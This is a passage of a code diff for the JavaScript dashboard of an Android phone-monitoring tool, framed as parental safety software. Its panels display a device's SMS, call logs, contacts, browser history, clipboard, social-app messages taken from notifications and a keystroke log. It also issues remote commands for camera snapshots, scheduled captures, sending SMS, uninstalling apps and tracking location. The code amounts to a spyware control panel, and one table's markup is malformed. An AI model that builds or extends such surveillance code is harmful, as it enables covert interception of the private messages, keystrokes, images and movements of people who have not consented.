+            if (dataType === 'sms') renderTable(currentData, ['Type', 'Number', 'Message', 'Date']);
+            else if (dataType === 'call') renderTable(currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']);
+            else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']);
+            else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
+            else if (dataType === 'social') renderTable(currentData, ['App', 'From/Title', 'Message', 'Date']);
+        };
+
+        function displaySMS(data) {
+            let smsArray = [];
+            try {
+                if (!data) smsArray = [];
+                else if (Array.isArray(data)) smsArray = data;
+                else if (typeof data === 'string') smsArray = JSON.parse(data);
+                else if (data.data && Array.isArray(data.data)) smsArray = data.data;
+                else if (typeof data === 'object') {
+                    for (let k in data) { if (Array.isArray(data[k])) { smsArray = data[k]; break; } }
+                }
+            } catch (e) { console.error('SMS parse error:', e); }
+
+            if (!Array.isArray(smsArray) || smsArray.length === 0) {
+                panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found or awaiting sync.</p>';
                 return;
             }
-            showGeofencePanelWithLocation();
+            
+            smsArray.sort((a, b) => parseInt(b.date || b.timestamp || 0) - parseInt(a.date || a.timestamp || 0));
+
+            const rows = smsArray.map(m => [
+                (m.type === 'inbox' || m.type == 1 || m.type === '1') ? '📥 Incoming' : '📤 Outgoing',
+                m.address || m.number || '',
+                m.body || m.text || '',
+                formatAnyDate(m.date || m.timestamp || m.timeFmt)
+            ]);
+            currentSortCol = 3; 
+            currentSortDir = 'desc';
+            currentData = rows;
+            dataType = 'sms';
+            renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
         }
 
-        function showGeofencePanelWithLocation() {
-            const lat = currentLocation.lat, lon = currentLocation.lon;
-            panel.innerHTML = `<h3>🗺️ Geofence — Safety Zone</h3><p>Current device location: ${lat.toFixed(6)}, ${lon.toFixed(6)}</p><div id="geofenceMap" style="height:320px;margin-bottom:12px;"></div><div style="display:flex;gap:8px;flex-wrap:wrap;"><input id="gfLat" placeholder="Latitude" value="${lat.toFixed(6)}"><input id="gfLon" placeholder="Longitude" value="${lon.toFixed(6)}"><input id="gfRadius" placeholder="Radius (m)" value="500"></div><div class="geofence-controls"><button id="setFenceBtn" style="background:#1976ff;">📍 Set Fence Here</button><button id="useCurrentBtn" style="background:#4caf50;">📍 Use Current Location</button><button id="clearFenceBtn" style="background:#ff9800;">🗑️ Clear Fence</button><button id="getFenceStatusBtn" style="background:#2196f3;">📊 Status</button></div><div id="fenceStatus"></div>`;
+        function displayCallLogs(data) {
+            let callArray = [];
+            try {
+                if (!data) callArray = [];
+                else if (Array.isArray(data)) callArray = data;
+                else if (typeof data === 'string') callArray = JSON.parse(data);
+                else if (data.data && Array.isArray(data.data)) callArray = data.data;
+                else if (typeof data === 'object') {
+                    for (let k in data) { if (Array.isArray(data[k])) { callArray = data[k]; break; } }
+                }
+            } catch (e) { console.error('Call log parse error:', e); }
+
+            if (!Array.isArray(callArray) || callArray.length === 0) {
+                panel.innerHTML = '<h3>📞 Call Logs</h3><p>No call logs found.</p>';
+                return;
+            }
+            
+            callArray.sort((a, b) => parseInt(b.date || b.timestamp || 0) - parseInt(a.date || a.timestamp || 0));
+
+            const rows = callArray.map(c => {
+                const t = (c.type || '').toString().toUpperCase();
+                const typeLabel = (t.includes('INCOMING') || t === '1') ? '📥 Incoming' : 
+                                  (t.includes('OUTGOING') || t === '2') ? '📤 Outgoing' : 
+                                  (t.includes('MISSED') || t === '3') ? '🚫 Missed' : (c.type || 'Unknown');
+                return [
+                    typeLabel,
+                    c.number || '',
+                    c.name || '',
+                    formatAnyDate(c.date || c.timestamp || c.timeFmt),
+                    formatDurationSeconds(c.duration)
+                ];
+            });
+            currentSortCol = 3; 
+            currentSortDir = 'desc';
+            currentData = rows;
+            dataType = 'call';
+            renderTable(rows, ['Type', 'Number', 'Name', 'Date', 'Duration']);
+        }
+
+        function displayContacts(data) {
+            let contactArray = data;
+            if (typeof data === 'string') {
+                try { contactArray = JSON.parse(data); } catch (e) { contactArray = []; }
+            }
+            if (!Array.isArray(contactArray) || contactArray.length === 0) {
+                panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>';
+                return;
+            }
+            contactArray.sort((a, b) => (b.timesContacted || 0) - (a.timesContacted || 0));
+            const rows = contactArray.map(c => [
+                c.name || '',
+                c.number || '',
+                c.timesContacted || 0
+            ]);
+            currentData = rows;
+            dataType = 'contacts';
+            renderTable(rows, ['Name', 'Number', 'Times Contacted']);
+        }
+
+        function displayWifiNetworks(data) {
+            if (!Array.isArray(data) || data.length === 0) {
+                panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>';
+                return;
+            }
+            const rows = data.map(n => {
+                const bars = n.rssi > -50 ? '████' : (n.rssi > -70 ? '███░' : (n.rssi > -80 ? '██░░' : '█░░░'));
+                const status = n.connected ? '● Connected' : '○';
+                return [n.ssid || '(hidden)', bars, status];
+            });
+            currentData = rows;
+            dataType = 'wifi';
+            renderTable(rows, ['SSID', 'Signal', 'Status']);
+        }
+
+        function displayInstalledApps(data) {
+            if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
+            panel.innerHTML = `<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></td></thead><tbody>${data.map(app => `<tr><td>${escapeHtml(app.appName || '')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName || '')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></tr></div>`;
+            document.querySelectorAll('.open-app').forEach(btn => btn.onclick = () => sendCommand('OPEN_APP', { package: btn.dataset.pkg }));
+            document.querySelectorAll('.remove-app').forEach(btn => btn.onclick = () => sendCommand('UNINSTALL_APP', { package: btn.dataset.pkg }));
+        }
+
+        function displayBrowserHistory(data) {
+            if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
+            panel.innerHTML = `<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item => `<tr><td>${item.date || item.timeFmt || ''}</td><td>${escapeHtml(item.title || '')}</td><td><a href="${escapeHtml(item.url || '#')}" target="_blank">${escapeHtml(item.url || '')}</a></td></tr>`).join('')}</tbody></table></div>`;
+        }
+
+        function displayKeylog(data) {
+            if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
+            data.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+            panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.map(e => `<tr><td>${e.timeFmt || ''}</td><td>${(e.pkg || '').split('.').pop()}</td><td>${escapeHtml(e.text || e.key || '')}</td></tr>`).join('')}</tbody></table></div>`;
+            document.getElementById('clearKeylogBtn')?.addEventListener('click', () => sendCommand('CLEAR_KEYLOG'));
+        }
+
+        function displayClipboard(data) {
+            const content = data && data.content ? data.content : (data || '');
+            panel.innerHTML = `<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data && data.type ? data.type : 'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div><p style="margin-top:12px;">Captures copied text from device.</p>`;
+        }
+
+        function displaySocialMessages(data) {
+            let msgs = typeof data === 'string' ? JSON.parse(data) : data;
+            if (!Array.isArray(msgs) || !msgs.length) { panel.innerHTML = '<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
+            msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+            const rows = msgs.map(m => [
+                escapeHtml(m.app || getAppNameFromPkg(m.pkg) || 'Unknown'),
+                escapeHtml(m.title || ''),
+                escapeHtml(m.text || m.body || ''),
+                m.timeFmt || ''
+            ]);
+            currentData = rows;
+            dataType = 'social';
+            renderTable(rows, ['App', 'From/Title', 'Message', 'Date']);
+        }
+    
+        function getAppNameFromPkg(pkg) { const map = { 'com.whatsapp': 'WhatsApp', 'org.telegram.messenger': 'Telegram', 'com.instagram.android': 'Instagram', 'com.facebook.orca': 'Messenger', 'com.facebook.katana': 'Facebook', 'com.snapchat.android': 'Snapchat' }; return map[pkg] || pkg; }
+
+        function showGeofencePanel() {
+            panel.innerHTML = `
+                <div class="premium-panel">
+                    <h3>🛡️ Geofence Control</h3>
+                    <p>Designate a safety zone. You will receive alerts when the device enters or leaves this area.</p>
+                    
+                    <div id="geofenceStatusCard" class="gps-stat-card" style="margin-bottom: 20px; border-left: 4px solid var(--border);">
+                        <div class="label">Current Status</div>
+                        <div id="fenceStatusVal" class="value">No Active Fence</div>
+                    </div>
+
+                    <div id="geofenceMap" style="height:350px; border-radius:var(--radius-md); border:1px solid var(--border); margin-bottom: 20px;"></div>
+                    
+                    <div class="radius-slider-container">
+                        <label>Fence Radius: <span id="radiusLabel">500</span>m</label>
+                        <input type="range" id="fenceRadius" min="50" max="2000" step="50" value="500" class="premium-slider">
+                    </div>
+
+                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                        <button class="btn-ui primary" onclick="setGeofenceHere()">📍 Set At Center</button>
+                        <button class="btn-ui primary" onclick="sendCommand('GET_GEOFENCE')">🔄 Fetch Current</button>
+                    </div>
+                    
+                    <button class="btn-ui danger" onclick="clearGeofence()" style="width:100%; margin-top:12px;">🗑️ Deactivate Geofence</button>
+                    
+                    <div style="margin-top:20px; padding-top:20px; border-top:1px solid var(--border);">
+                         <p style="font-size:12px; color:var(--text-sec);">Cloud Sync: Geofence settings are synchronized with your account.</p>
+                         <div id="geofenceStatusMsg" style="margin-top:16px; font-weight:500; text-align:center;"></div>
+                    </div>
+                </div>`;
+
+            const slider = document.getElementById('fenceRadius');
+            const label = document.getElementById('radiusLabel');
+            slider.oninput = () => { label.textContent = slider.value; if (window._fenceCircle) window._fenceCircle.setRadius(slider.value); };
+
             setTimeout(() => {
-                const map = L.map('geofenceMap').setView([lat, lon], 15);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                let marker = L.marker([lat, lon]).addTo(map).bindPopup('Current Location');
-                let circle;
-                map.on('click', e => {
-                    document.getElementById('gfLat').value = e.latlng.lat.toFixed(6);
-                    document.getElementById('gfLon').value = e.latlng.lng.toFixed(6);
-                    if (marker) map.removeLayer(marker);
-                    marker = L.marker([e.latlng.lat, e.latlng.lng]).addTo(map).bindPopup('Selected Fence Center');
-                    if (circle) map.removeLayer(circle);
-                    const r = parseFloat(document.getElementById('gfRadius').value) || 500;
-                    circle = L.circle([e.latlng.lat, e.latlng.lng], { radius: r, color: '#d32f2f', fillColor: '#d32f2f', fillOpacity: 0.15 }).addTo(map);
+                const center = currentLocation ? [currentLocation.lat, currentLocation.lon] : [20.0, 0.0];
+                window._geofenceMap = L.map('geofenceMap').setView(center, currentLocation ? 16 : 2);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._geofenceMap);
+                
+                window._geofenceLayers = L.layerGroup().addTo(window._geofenceMap);
+                
+                window._geofenceMap.on('move', () => {
+                    if (window._fenceCircle) window._fenceCircle.setLatLng(window._geofenceMap.getCenter());
                 });
-                document.getElementById('setFenceBtn').onclick = () => { const lat2 = parseFloat(document.getElementById('gfLat').value); const lon2 = parseFloat(document.getElementById('gfLon').value); const rad = parseFloat(document.getElementById('gfRadius').value) || 500; if (isNaN(lat2) || isNaN(lon2)) return showNotification('Enter valid coordinates'); sendCommand('SET_GEOFENCE', { lat: lat2, lon: lon2, radius: rad }); showNotification('Geofence sent to device'); };
-                document.getElementById('useCurrentBtn').onclick = () => { document.getElementById('gfLat').value = lat.toFixed(6); document.getElementById('gfLon').value = lon.toFixed(6); if (marker) map.removeLayer(marker); marker = L.marker([lat, lon]).addTo(map).bindPopup('Current Location'); if (circle) map.removeLayer(circle); circle = L.circle([lat, lon], { radius: parseFloat(document.getElementById('gfRadius').value) || 500, color: '#d32f2f', fillColor: '#d32f2f', fillOpacity: 0.15 }).addTo(map); };
-                document.getElementById('clearFenceBtn').onclick = () => sendCommand('CLEAR_GEOFENCE');
-                document.getElementById('getFenceStatusBtn').onclick = () => sendCommand('GET_GEOFENCE');
+
+                if (currentLocation) {
+                    window._geofenceMap.setView([currentLocation.lat, currentLocation.lon], 16);
+                    updateGeofenceDeviceMarker(currentLocation.lat, currentLocation.lon, currentLocation.acc);
+                }
+
+                // Load existing fence from cloud
+                loadGeofenceFromFirebase();
             }, 100);
         }
 
-        function displayGeofenceInfo(data) {
-            const statusDiv = document.getElementById('fenceStatus');
-            if (statusDiv && data && data.active) statusDiv.innerHTML = `<div style="margin-top:12px;padding:12px;background:#e8f5e9;border-radius:8px;"><strong>✅ Active Geofence</strong><br>📍 ${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}<br>📏 Radius: ${data.radius}m</div>`;
-            else if (statusDiv) statusDiv.innerHTML = `<div style="margin-top:12px;padding:12px;background:#fff3e0;border-radius:8px;">⚠️ No active geofence</div>`;
+        function updateGeofenceDeviceMarker(lat, lon, acc) {
+            if (!window._geofenceMap) return;
+            if (!window._geofenceDeviceLayer) {
+                window._geofenceDeviceLayer = L.layerGroup().addTo(window._geofenceMap);
+            }
+            window._geofenceDeviceLayer.clearLayers();
+            L.circleMarker([lat, lon], {
+                radius: 8,
+                color: '#fff',
+                weight: 2,
+                opacity: 1,
+                fillColor: '#007bff',
+                fillOpacity: 1,
+                className: 'pulse-marker'
+            }).addTo(window._geofenceDeviceLayer);
+            
+            if (acc) {
+                L.circle([lat, lon], {
+                    radius: acc,
+                    color: '#007bff',
+                    weight: 1,
+                    opacity: 0.3,
+                    fillColor: '#007bff',
+                    fillOpacity: 0.1
+                }).addTo(window._geofenceDeviceLayer);
+            }
+        }
+
+        async function saveGeofenceToFirebase(lat, lon, radius) {
+            if (!currentUser || !selectedDeviceId) return;
+            try {
+                await db.collection('devices').doc(selectedDeviceId).collection('settings').doc('geofence').set({
+                    lat, lon, radius, active: true, updated: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                showNotification('✅ Saved to Cloud');
+            } catch (e) { console.error('Firebase Save Error:', e); }
+        }
+
+        async function loadGeofenceFromFirebase() {
+            if (!currentUser || !selectedDeviceId) return;
+            try {
+                const doc = await db.collection('devices').doc(selectedDeviceId).collection('settings').doc('geofence').get();
+                if (doc.exists) {
+                    const data = doc.data();
+                    if (data.active) displayGeofenceInfo(data, true);
+                }
+            } catch (e) { console.error('Firebase Load Error:', e); }
+        }
+
+        function setGeofenceHere() {
+            const center = window._geofenceMap.getCenter();
+            const radius = parseInt(document.getElementById('fenceRadius').value);
+            sendCommand('SET_GEOFENCE', { lat: center.lat, lon: center.lng, radius });
+            saveGeofenceToFirebase(center.lat, center.lng, radius);
+            displayGeofenceInfo({ lat: center.lat, lon: center.lng, radius }, true);
+            const statusMsg = document.getElementById('geofenceStatusMsg');
+            if (statusMsg) statusMsg.innerHTML = '<div style="color:var(--success); background:var(--success-bg); padding:10px; border-radius:8px; border:1px solid #def7ec;">✅ Geofence has been successfully set.</div>';
+        }
+
+        function clearGeofence() {
+            sendCommand('CLEAR_GEOFENCE');
+            if (currentUser && selectedDeviceId) {
+                db.collection('devices').doc(selectedDeviceId).collection('settings').doc('geofence').set({ active: false });
+            }
+            if (window._fenceCircle) window._geofenceLayers.removeLayer(window._fenceCircle);
+            window._fenceCircle = null;
+            document.getElementById('fenceStatusVal').textContent = 'No Active Fence';
+            document.getElementById('geofenceStatusCard').style.borderLeft = '4px solid var(--border)';
+            const statusMsg = document.getElementById('geofenceStatusMsg');
+            if (statusMsg) statusMsg.innerHTML = '<div style="color:var(--text-sec); background:#f1f5f9; padding:10px; border-radius:8px; border:1px solid var(--border);">🗑️ Geofence has been deactivated.</div>';
+            showNotification('Geofence Deactivated');
+        }
+
+        function displayGeofenceInfo(data, fromCloud = false) {
+            if (!document.getElementById('fenceStatusVal')) return;
+            
+            const lat = data.lat || data.latitude;
+            const lon = data.lon || data.longitude;
+            const radius = data.radius;
+
+            document.getElementById('fenceStatusVal').textContent = `ACTIVE (Radius: ${radius}m)`;
+            document.getElementById('geofenceStatusCard').style.borderLeft = '4px solid var(--success)';
+            
+            if (window._geofenceLayers) {
+                window._geofenceLayers.clearLayers();
+                window._fenceCircle = L.circle([lat, lon], {
+                    radius: radius,
+                    color: '#0f62fe',
+                    fillColor: '#0f62fe',
+                    fillOpacity: 0.2
+                }).addTo(window._geofenceLayers);
+                
+                if (fromCloud) window._geofenceMap.setView([lat, lon], 15);
+            }
+            
+            if (!fromCloud) showNotification('Geofence synced from device');
+        }
+
+        function showSchedulePanel() {
+            panel.innerHTML = '<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label style="margin-left:12px;">Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;">Start</button><button id="stopSched" style="background:#d32f2f;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;margin-left:8px;">Stop</button></div>';
+            document.getElementById('startSched').onclick = () => { const mins = parseInt(document.getElementById('schedInterval').value) || 5; const cam = parseInt(document.getElementById('schedCam').value); sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes: mins, cameraId: cam }); };
+            document.getElementById('stopSched').onclick = () => sendCommand('STOP_SCHEDULED_CAPTURE');
+        }
+
+        function showSendSmsPanel() {
+            panel.innerHTML = '<h3>✉️ Send SMS</h3><div><input id="smsNumber" placeholder="Phone Number" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"><textarea id="smsBody" rows="4" placeholder="Message" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"></textarea><button id="sendSmsBtn" style="background:#1976ff;color:white;border:none;padding:10px;border-radius:6px;width:100%;">Send SMS</button></div>';
+            document.getElementById('sendSmsBtn').onclick = () => { const num = document.getElementById('smsNumber').value.trim(); const body = document.getElementById('smsBody').value.trim(); if (!num || !body) return showNotification('Enter number and message'); sendCommand('SEND_SMS', { number: num, body }); };
         }
 
         function showLocationHistoryPanel() {
-            panel.innerHTML = `<h3>📍 Location History</h3><p>GPS fixes are logged automatically every 30 mins. Select a timeframe to fetch data.</p><div style="display:flex; gap: 8px; margin-bottom: 24px;"><button class="btn-ui primary" data-days="1">Today</button><button class="btn-ui primary" data-days="3">Last 3 Days</button><button class="btn-ui primary" data-days="5">Last 5 Days</button></div><div id="historyMap" style="height:400px; border-radius:12px; border:1px solid var(--border); margin-bottom: 24px;"></div><div id="historyMainList"></div>`;
-            panel.querySelectorAll('button[data-days]').forEach(btn => { btn.onclick = () => { panel.querySelector('#historyMainList').innerHTML = '<p>Loading data...</p>'; sendCommand('GET_LOCATION_HISTORY', { days: parseInt(btn.dataset.days) }); }; });
-            setTimeout(() => { if (!window._historyMap) { window._historyMap = L.map('historyMap').setView([20.0, 0.0], 2); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); window._historyLayers = L.layerGroup().addTo(window._historyMap); } }, 100);
-            sendCommand('GET_LOCATION_HISTORY', { days: 3 });
+            panel.innerHTML = `
+                <div class="premium-panel">
+                    <h3>📍 Location History</h3>
+                    <p>Access persistent location logs stored on the device or in the cloud.</p>
+                    
+                    <div style="display:flex; gap: 10px; margin-bottom: 20px;">
+                        <select id="histDays" class="btn-ui secondary" style="flex:1;">
+                            <option value="1">Past 24 Hours</option>
+                            <option value="3" selected>Last 3 Days</option>
+                            <option value="5">Last 5 Days</option>
+                        </select>
+                        <button class="btn-ui primary" onclick="fetchHistoryFromCloud()">☁️ Fetch Cloud</button>
+                    </div>
+
+                    <div id="historyMap" style="height:400px; border-radius:var(--radius-md); border:1px solid var(--border); margin-bottom: 24px;"></div>
+                    
+                    <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                        <span class="label" style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase;">Timeline</span>
+                        <button class="btn-ui secondary" onclick="sendCommand('GET_LOCATION_HISTORY', { days: parseInt(document.getElementById('histDays').value) })">📟 Pull From Device</button>
+                    </div>
+                    
+                    <div id="historyMainList" style="max-height: 400px; overflow-y: auto; background: white; border-radius: var(--radius-md); border: 1px solid var(--border);">
+                         <p style="padding: 20px; text-align: center; color: var(--text-sec);">Select source to view history</p>
+                    </div>
+                </div>`;
+
+            setTimeout(() => { 
+                if (!window._historyMap) {
+                    window._historyMap = L.map('historyMap').setView([20.0, 0.0], 2); 
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); 
+                    window._historyLayers = L.layerGroup().addTo(window._historyMap);
+                }
+            }, 100);
         }
 
-        function displayLocationHistory(data) {
+        async function fetchHistoryFromCloud() {
+            if (!currentUser || !selectedDeviceId) return;
+            const days = parseInt(document.getElementById('histDays').value);
+            const cutoff = Date.now() - (days * 86400000);
+            const listDiv = panel.querySelector('#historyMainList');
+            listDiv.innerHTML = '<p style="padding:20px; text-align:center;">🔍 Scanning cloud data...</p>';
+
+            try {
+                const snapshot = await db.collection('devices').doc(selectedDeviceId)
+                    .collection('location_history')
+                    .where('timestamp', '>', cutoff)
+                    .orderBy('timestamp', 'desc')
+                    .limit(500)
+                    .get();
+                
+                const history = snapshot.docs.map(doc => {
+                    const d = doc.data();
+                    const date = new Date(d.timestamp);
+                    d.timeFmt = date.toLocaleDateString() + ' ' + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                    return d;
+                });
+
+                displayLocationHistory(history, true);
+            } catch (e) { 
+                console.error('Cloud Fetch Error:', e); 
+                if (listDiv) listDiv.innerHTML = `<p style="padding:20px; color:var(--danger);">Error: ${e.message}</p>`;
+            }
+        }
+
+        function displayLocationHistory(data, fromCloud = false) { 
             const history = typeof data === 'string' ? JSON.parse(data) : data;
-            if (!Array.isArray(history) || history.length === 0) { const listDiv = panel.querySelector('#historyMainList'); if (listDiv) listDiv.innerHTML = '<p>No history found for this period.</p>'; return; }
-            if (!window._historyMap) { window._historyMap = L.map('historyMap').setView([20.0, 0.0], 2); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); }
-            if (!window._historyLayers) { window._historyLayers = L.layerGroup().addTo(window._historyMap); }
+            const listDiv = panel.querySelector('#historyMainList');
+
+            if (!Array.isArray(history) || history.length === 0) {
+                if (listDiv) listDiv.innerHTML = '<p style="padding:20px; text-align:center;">No history found for this period.</p>';
+                return;
+            }
+            
+            // Ensure map and layers are initialized
+            if (!window._historyMap) {
+                 window._historyMap = L.map('historyMap').setView([20.0, 0.0], 2); 
+                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); 
+            }
+            if (!window._historyLayers) {
+                 window._historyLayers = L.layerGroup().addTo(window._historyMap);
+            }
+            
+            // Clear map layers
             window._historyLayers.clearLayers();
+            
             const points = [];
-            let html = `<div class="table-container"><table><thead><tr><th>Time</th><th>Location</th><th>Address</th></tr></thead><tbody>`;
-            history.forEach((loc, index) => {
+            let html = '';
+            
+            history.forEach((loc) => {
                 const lat = loc.lat || loc.latitude;
                 const lon = loc.lon || loc.longitude;
                 if (lat && lon) {
                     points.push([lat, lon]);
-                    const marker = L.circleMarker([lat, lon], { radius: 6, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.8 }).bindPopup(`<b>Time:</b> ${loc.timeFmt || ''}<br><b>Acc:</b> ${loc.accuracy || 0}m<br>${loc.address || ''}`);
-                    if (window._historyLayers) marker.addTo(window._historyLayers);
+                    const marker = L.circleMarker([lat, lon], { radius: 6, color: '#0f62fe', fillColor: '#0f62fe', fillOpacity: 0.8 })
+                        .bindPopup(`<b>Time:</b> ${loc.timeFmt || ''}<br><b>Acc:</b> ${loc.accuracy || 0}m<br>${loc.address || ''}`);
+                    marker.addTo(window._historyLayers);
                 }
-                html += `<tr><td>${loc.timeFmt || ''}</td><td style="font-size:11px;">${lat !== undefined ? lat.toFixed(5) : ''}, ${lon !== undefined ? lon.toFixed(5) : ''}</td><td>${escapeHtml(loc.address || '')}</td></tr>`;
+                
+                html += `
+                    <div class="history-timeline-item" onclick="window._historyMap.setView([${lat}, ${lon}], 18)">
+                        <div style="font-size:13px; font-weight:700;">${loc.timeFmt || 'Unknown Time'}</div>
+                        <div style="font-size:11px; color:var(--text-sec); margin-bottom:4px;">${lat.toFixed(5)}, ${lon.toFixed(5)}</div>
+                        <div style="font-size:12px;">${escapeHtml(loc.address || 'Point match')}</div>
+                    </div>`;
             });
-            html += `</tbody></table></div>`;
-            const listDiv = panel.querySelector('#historyMainList');
+            
             if (listDiv) listDiv.innerHTML = html;
+            
             if (points.length > 0 && window._historyMap) {
-                const polyline = L.polyline(points, { color: '#1976ff', weight: 4, opacity: 0.5 });
-                if (window._historyLayers) polyline.addTo(window._historyLayers);
+                const polyline = L.polyline(points, { color: '#0f62fe', weight: 4, opacity: 0.3, dashArray: '5, 10' });
+                polyline.addTo(window._historyLayers);
                 window._historyMap.fitBounds(polyline.getBounds(), { padding: [30, 30] });
+            }
+
+            showNotification(fromCloud ? '✅ History loaded from cloud' : '✅ History loaded from device');
+        }
+
+        function showAppEventsPanel() {
+            panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events from device.</p><div><button data-days="1" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">Today</button><button data-days="3" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">3 Days</button><button data-days="5" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">5 Days</button></div><div id="appEventsList"></div>';
+            panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) }));
+            sendCommand('GET_APP_EVENTS', { days: 5 });
+        }
+
+        function displayAppEvents(data) { panel.innerHTML = '<p>Events loaded</p>'; }
+
+        function showSmsKeywordsPanel() {
+            panel.innerHTML = '<h3>🔑 SMS Keyword Alerts</h3><p>Get alerts when incoming SMS contains any of these words.</p><div><input id="kwInput" placeholder="drug, fight, bully" style="width:100%;padding:8px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"><button id="saveKw" style="background:#1976ff;color:white;border:none;padding:8px;border-radius:6px;width:100%;">Save Keywords</button></div><div style="margin-top:12px;"><button id="viewKw" style="background:#4caf50;color:white;border:none;padding:6px 12px;border-radius:6px;">View Current</button><button id="clearKw" style="background:#ff9800;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">Clear All</button><button id="viewAlerts" style="background:#2196f3;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">View Alerts</button></div><div id="kwResult" style="margin-top:12px;"></div>';
+            document.getElementById('saveKw').onclick = () => { const raw = document.getElementById('kwInput').value.trim(); if (!raw) return showNotification('Enter at least one keyword'); const kws = raw.split(',').map(k => k.trim()).filter(k => k); sendCommand('SET_SMS_KEYWORDS', { keywords: kws }); };
+            document.getElementById('viewKw').onclick = () => sendCommand('GET_SMS_KEYWORDS');
+            document.getElementById('clearKw').onclick = () => sendCommand('CLEAR_SMS_KEYWORDS');
+            document.getElementById('viewAlerts').onclick = () => sendCommand('GET_SMS_ALERTS', { days: 5 });
+        }
+
+        function displaySmsKeywords(data) { }
+        function displaySmsAlerts(data) { }
+
+        function capturePicture() { const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT', { camera, flash: document.getElementById('clickFlashCheckbox').checked }); }
+        function displayCapturedImage(b64) { panel.innerHTML = `<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`; }
+
+        async function renderDeviceOverview(isRefresh = false) {
+            if (!isRefresh) panel.innerHTML = '<div style="padding:24px;">⏳ Building dashboard view...</div>';
+            try {
+                const doc = await db.collection('devices').doc(selectedDeviceId).get();
+                const data = doc.exists ? doc.data() : {};
+                
+                // Fallback field mapping for different android versions/schemes
+                const battery = data.batteryLevel || data.level || data.battery || '??';
+                const signal = data.signalStrength || data.signal || data.rssi || '??';
+                const model = data.name || data.deviceModel || data.model || 'Connected Device';
+                const platform = data.platform || 'Android';
+                const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleString() : 'Recently';
+                
+                // Location Recovery: Use document location if global currentLocation is empty
+                const docLat = data.lat || data.latitude;
+                const docLon = data.lon || data.longitude;
+                const docAcc = data.accuracy || 20;
+                if (!currentLocation && docLat && docLon) {
+                    currentLocation = { lat: parseFloat(docLat), lon: parseFloat(docLon), acc: parseFloat(docAcc) };
+                }
+
+                panel.innerHTML = `
+                <div style="padding:32px; animation: fadeIn 0.5s ease-out;">
